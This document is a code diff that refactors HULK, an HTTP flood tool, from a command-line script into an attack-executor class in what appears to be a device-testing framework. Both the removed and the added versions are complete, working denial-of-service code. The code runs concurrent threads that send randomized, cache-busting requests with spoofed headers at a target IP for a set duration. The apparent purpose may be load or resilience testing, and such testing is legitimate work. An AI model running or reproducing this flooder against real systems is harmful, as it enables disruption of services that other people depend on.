@@ -1,145 +1,111 @@
-#!/usr/bin/env python3
-# ----------------------------------------------------------------------------------------------
-# HULK - HTTP Unbearable Load King (Python 3, Timed, Modified Argument Order)
-# Usage: python3 hulk.py <duration> <url>
-# Example: python3 hulk.py 60 http://192.168.1.172
-# ----------------------------------------------------------------------------------------------
+from __future__ import annotations
 
-import os
 import random
-import re
-import sys
 import threading
 import time
 import urllib.error
 import urllib.request
 
-# Globals
-url = ''
-host = ''
-headers_useragents = []
-headers_referers = []
-request_counter = 0
-flag = 0
+from typing import TYPE_CHECKING
+
+if TYPE_CHECKING:
+    from pathlib import Path
+
+    from capex.models import DeviceConfig, HulkAttackConfig
+
+# HULK - HTTP Unbearable Load King: floods a target with randomized,
+# cache-busting GET requests from many concurrent threads.
+
+_USER_AGENTS = [
+    'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
+    'Mozilla/5.0 (Windows; U; Windows NT 6.1; en) Gecko/20090824 Firefox/3.5.3',
+    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 Chrome/89.0 Safari/537.36',
+    'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
+]
+
+_REQUEST_TIMEOUT_SECONDS = 10
+_WORKER_JOIN_TIMEOUT_SECONDS = 5
+_ERROR_BACKOFF_SECONDS = 0.5
 
 
-def inc_counter():
-    global request_counter
-    request_counter += 1
-
-
-def set_flag(val):
-    global flag
-    flag = val
-
-
-def useragent_list():
-    global headers_useragents
-    headers_useragents = [
-        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
-        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en) Gecko/20090824 Firefox/3.5.3',
-        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 Chrome/89.0 Safari/537.36',
-        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
-    ]
-
-
-def referer_list():
-    global headers_referers
-    headers_referers = ['http://www.google.com/?q=', 'http://www.bing.com/search?q=', f'http://{host}/']
-
-
-def buildblock(size):
+def _random_block(size: int) -> str:
     return ''.join(chr(random.randint(65, 90)) for _ in range(size))
 
 
-def usage():
-    print('---------------------------------------------------')
-    print('USAGE: python3 hulk.py <duration_seconds> <url>')
-    print('Example: python3 hulk.py 60 http://192.168.1.172')
-    print('---------------------------------------------------')
-
-
-def httpcall(target_url):
-    useragent_list()
-    referer_list()
+def _build_request(target_url: str, host: str) -> urllib.request.Request:
     param_joiner = '&' if '?' in target_url else '?'
-    full_url = target_url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10))
+    param_name = _random_block(random.randint(3, 10))
+    param_value = _random_block(random.randint(3, 10))
+    full_url = f'{target_url}{param_joiner}{param_name}={param_value}'
+
+    referer_base = random.choice(['http://www.google.com/?q=', 'http://www.bing.com/search?q=', f'http://{host}/'])
 
     request = urllib.request.Request(full_url)
-    request.add_header('User-Agent', random.choice(headers_useragents))
+    request.add_header('User-Agent', random.choice(_USER_AGENTS))
     request.add_header('Cache-Control', 'no-cache')
     request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-    request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5, 10)))
+    request.add_header('Referer', referer_base + _random_block(random.randint(5, 10)))
     request.add_header('Keep-Alive', str(random.randint(110, 120)))
     request.add_header('Connection', 'keep-alive')
     request.add_header('Host', host)
-
-    try:
-        urllib.request.urlopen(request)
-    except urllib.error.HTTPError:
-        set_flag(1)
-        print('[!] HTTP 500 Error – overload indication')
-    except urllib.error.URLError:
-        sys.exit('[!] Failed to reach host')
-    else:
-        inc_counter()
+    return request
 
 
-class HTTPThread(threading.Thread):
-    def run(self):
-        try:
-            while flag < 2:
-                httpcall(url)
-        except Exception:
-            pass
+class _FloodWorker(threading.Thread):
+    """Continuously sends flood requests until told to stop."""
+
+    def __init__(self, *, target_url: str, host: str, stop_event: threading.Event) -> None:
+        super().__init__(daemon=True)
+        self._target_url = target_url
+        self._host = host
+        self._stop_event = stop_event
+        self.request_count = 0
+
+    def run(self) -> None:
+        while not self._stop_event.is_set():
+            try:
+                urllib.request.urlopen(
+                    _build_request(self._target_url, self._host),
+                    timeout=_REQUEST_TIMEOUT_SECONDS,
+                )
+            except urllib.error.URLError:
+                # Target unreachable/refusing connections; back off briefly
+                # rather than spin the CPU retrying as fast as possible.
+                self._stop_event.wait(_ERROR_BACKOFF_SECONDS)
+            else:
+                self.request_count += 1
 
 
-class MonitorThread(threading.Thread):
-    def run(self):
-        previous = request_counter
-        while flag == 0:
-            time.sleep(5)
-            if request_counter - previous >= 100:
-                print(f'[+] {request_counter} requests sent')
-                previous = request_counter
-        print('[*] HULK attack ended.')
+class HulkAttackExecutor:
+    def __init__(self, *, attack: HulkAttackConfig) -> None:
+        self._attack = attack
 
+    def execute(
+        self,
+        *,
+        device: DeviceConfig,
+        log_path: Path,
+    ) -> None:
+        target_url = f'http://{device.ip}'
+        host = str(device.ip)
+        stop_event = threading.Event()
 
-class HulkAttackExecutor: ...
+        workers = [
+            _FloodWorker(target_url=target_url, host=host, stop_event=stop_event)
+            for _ in range(self._attack.thread_count)
+        ]
+        for worker in workers:
+            worker.start()
 
+        time.sleep(self._attack.duration_seconds)
 
-# Entry
-if __name__ == '__main__':
-    if len(sys.argv) < 3:
-        usage()
-        sys.exit(1)
+        stop_event.set()
+        for worker in workers:
+            worker.join(timeout=_WORKER_JOIN_TIMEOUT_SECONDS)
 
-    try:
-        duration = int(sys.argv[1])
-    except ValueError:
-        usage()
-        sys.exit('[!] First argument must be an integer duration in seconds.')
+        total_requests = sum(worker.request_count for worker in workers)
 
-    url = sys.argv[2]
-    if not url.startswith('http'):
-        url = 'http://' + url
-
-    m = re.search(r'(https?\://)?([^/]+)', url)
-    host = m.group(2)  # type: ignore
-
-    print(f'[*] Starting HULK attack on {url} for {duration} seconds.')
-
-    threads = []
-    for _ in range(100):
-        t = HTTPThread()
-        t.daemon = True
-        t.start()
-        threads.append(t)
-
-    monitor = MonitorThread()
-    monitor.daemon = True
-    monitor.start()
-
-    time.sleep(duration)
-    print('[*] Duration reached. Exiting now.')
-    os._exit(0)
+        with log_path.open('a', encoding='utf-8') as handle:
+            handle.write(
+                f'attack={self._attack.label} device={device.name} requests={total_requests} timestamp={time.time()}\n'
+            )
